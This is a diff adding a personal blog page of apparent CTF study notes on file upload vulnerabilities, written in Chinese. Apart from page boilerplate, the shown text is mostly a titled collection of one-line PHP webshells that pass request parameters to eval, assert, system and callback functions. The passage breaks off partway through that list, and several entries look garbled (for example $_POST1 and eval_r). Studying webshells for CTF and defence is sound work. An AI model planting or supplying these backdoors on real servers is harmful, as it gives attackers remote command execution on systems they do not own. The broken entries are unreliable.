@@ -1,0 +1,1449 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>文件上传漏洞 - Ting BLOG🐈</title><meta name="author" content="Ting">
+<meta name="description" content="文件上传漏洞参考博客
+"><meta name="keywords" content='Web, 文件上传'>
+  <meta itemprop="name" content="文件上传漏洞">
+  <meta itemprop="description" content="文件上传漏洞参考博客">
+  <meta itemprop="datePublished" content="2024-10-30T11:25:40+08:00">
+  <meta itemprop="dateModified" content="2024-10-30T11:25:40+08:00">
+  <meta itemprop="wordCount" content="1113">
+  <meta itemprop="keywords" content="Web,文件上传"><meta property="og:url" content="http://localhost:1313/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="Ting BLOG🐈">
+  <meta property="og:title" content="文件上传漏洞">
+  <meta property="og:description" content="文件上传漏洞参考博客">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-30T11:25:40+08:00">
+    <meta property="article:modified_time" content="2024-10-30T11:25:40+08:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="文件上传">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="文件上传漏洞">
+  <meta name="twitter:description" content="文件上传漏洞参考博客">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞 - Ting BLOG🐈" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-gkctf-2020checkin/" title="【GKCTF 2020】CheckIN" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2024web-ssti%E6%A8%A1%E6%9D%BF%E5%88%A4%E6%96%AD/" title="SSTI模版判断" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.md" title="文件上传漏洞 - Ting BLOG🐈"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "文件上传漏洞",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/"
+    },"genre": "posts","keywords": "Web, 文件上传","wordcount":  1113 ,
+    "url": "http:\/\/localhost:1313\/posts\/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/","datePublished": "2024-10-30T11:25:40+08:00","dateModified": "2024-10-30T11:25:40+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Ting"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>文件上传漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="Tin10g.github.io" title="Author" rel=" author" class="author"><img loading="lazy" src="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png" alt="Ting" data-title="Ting" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ting</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/web--2024%E7%AC%94%E8%AE%B0/" class="post-category" title="Category - Web · 2024笔记"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Web · 2024笔记</a></span></div><div class="post-meta-line"><span title="published on 2024-10-30 11:25:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-10-30">2024-10-30</time></span>&nbsp;<span title="1113 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#原因">原因</a></li>
+    <li><a href="#webshell">WebShell</a></li>
+    <li><a href="#一句话木马大全">一句话木马大全</a>
+      <ul>
+        <li><a href="#php">PHP</a></li>
+        <li><a href="#jsp">JSP</a></li>
+        <li><a href="#asp">ASP</a></li>
+        <li><a href="#aspx">ASPX</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞产生原因">漏洞产生原因</a></li>
+    <li><a href="#常见安全问题">常见安全问题</a></li>
+    <li><a href="#web做题">Web做题！！</a>
+      <ul>
+        <li><a href="#常见文件后缀">常见文件后缀</a></li>
+        <li><a href="#客户端检查">客户端检查</a></li>
+        <li><a href="#服务端--检查后缀">服务端 · 检查后缀</a>
+          <ul>
+            <li><a href="#黑名单">黑名单</a></li>
+            <li><a href="#白名单">白名单</a></li>
+          </ul>
+        </li>
+        <li><a href="#服务端--检查内容">服务端 · 检查内容</a>
+          <ul>
+            <li><a href="#检查文件头">检查文件头</a></li>
+            <li><a href="#检查文件内容">检查文件内容</a></li>
+            <li><a href="#getimagesize">getimagesize()</a></li>
+          </ul>
+        </li>
+        <li><a href="#服务端--条件竞争">服务端 · 条件竞争</a>
+          <ul>
+            <li><a href="#原理">原理</a></li>
+            <li><a href="#基本思路">基本思路</a></li>
+            <li><a href="#利用">利用</a></li>
+            <li><a href="#一个源码例子">一个源码例子</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#做题的一些思路">做题的一些思路</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="文件上传漏洞" class="heading-element"><span>文件上传漏洞</span>
+  <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705"target="_blank" rel="external nofollow noopener noreferrer">参考博客</a></p>
+</blockquote>
+<h2 id="原因" class="heading-element"><span>原因</span>
+  <a href="#%e5%8e%9f%e5%9b%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等</p>
+<h2 id="webshell" class="heading-element"><span>WebShell</span>
+  <a href="#webshell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>以<strong>asp、php、jsp或者cgi</strong>等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。</p>
+<h2 id="一句话木马大全" class="heading-element"><span>一句话木马大全</span>
+  <a href="#%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac%e5%a4%a7%e5%85%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p>可速过</p>
+</blockquote>
+<h3 id="php" class="heading-element"><span>PHP</span>
+  <a href="#php" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;r00ts&#39;</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">phpinfo</span><span class="p">();</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="n">cmd</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="n">cmd</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="nb">assert</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="n">cmd</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="o">//</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">phpinfo</span><span class="p">()</span> <span class="err">@</span><span class="n">preg_replace</span><span class="p">(</span><span class="s2">&#34;/abc/e&#34;</span><span class="p">,</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span><span class="s2">&#34;abcd&#34;</span><span class="p">);</span> <span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> 
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="k">func</span> <span class="o">=</span><span class="n">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="k">func</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">?</span><span class="k">func</span><span class="o">=</span><span class="n">system</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="k">func</span><span class="o">=$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;func&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">cmd</span><span class="o">=$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=$</span><span class="n">cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">new_array</span><span class="o">=</span><span class="n">array_map</span><span class="p">(</span><span class="o">$</span><span class="k">func</span><span class="p">,</span><span class="o">$</span><span class="n">array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">print_r</span><span class="p">(</span><span class="o">$</span><span class="n">new_array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> 
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">phpinfo</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">call_user_func</span><span class="p">(</span><span class="nb">assert</span><span class="p">,</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> 
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">phpinfo</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">cmd</span><span class="o">=$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=$</span><span class="n">cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">call_user_func_array</span><span class="p">(</span><span class="s2">&#34;assert&#34;</span><span class="p">,</span><span class="o">$</span><span class="n">array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> 
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">?</span><span class="k">func</span><span class="o">=</span><span class="n">system</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">cmd</span><span class="o">=$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">array1</span><span class="o">=</span><span class="n">array</span><span class="p">(</span><span class="o">$</span><span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="k">func</span> <span class="o">=$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;func&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">array_filter</span><span class="p">(</span><span class="o">$</span><span class="n">array1</span><span class="p">,</span><span class="o">$</span><span class="k">func</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">usort</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">,</span><span class="s1">&#39;asse&#39;</span><span class="o">.</span><span class="s1">&#39;rt&#39;</span><span class="p">);</span><span class="err">?</span><span class="o">&gt;</span> <span class="n">php环境</span><span class="o">&gt;=&lt;</span><span class="mf">5.6</span><span class="err">才能用</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">usort</span><span class="p">(</span><span class="o">...$</span><span class="n">_GET</span><span class="p">);</span><span class="err">?</span><span class="o">&gt;</span>  <span class="n">php环境</span><span class="o">&gt;=</span><span class="mf">5.6</span><span class="err">才能用</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST1</span><span class="p">);</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);}</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">system</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST1</span><span class="p">);</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="p">(</span><span class="o">$</span><span class="n">_</span><span class="o">=</span><span class="err">@</span><span class="o">$</span><span class="n">_GET1</span><span class="p">)</span><span class="o">.</span><span class="err">@</span><span class="o">$</span><span class="n">_</span><span class="p">(</span><span class="o">$</span><span class="n">_POST1</span><span class="p">)</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">eval_r</span><span class="p">(</span><span class="o">$</span><span class="n">_POST1</span><span class="p">)</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval_r</span><span class="p">(</span><span class="o">$</span><span class="n">_POST1</span><span class="p">)</span><span class="err">?</span><span class="o">&gt;//</span><span class="err">容错代码</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="nb">assert</span><span class="p">(</span><span class="o">$</span><span class="n">_POST1</span><span class="p">);</span><span class="err">?</span><span class="o">&gt;//</span><span class="err">使用</span><span class="n">Lanker一句话客户端的专家模式执行相关的PHP语句</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">](</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;cc&#39;</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">](</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;cc&#39;</span><span class="p">],</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;cc&#39;</span><span class="p">])</span><span class="err">?</span><span class="o">&gt;</span> 
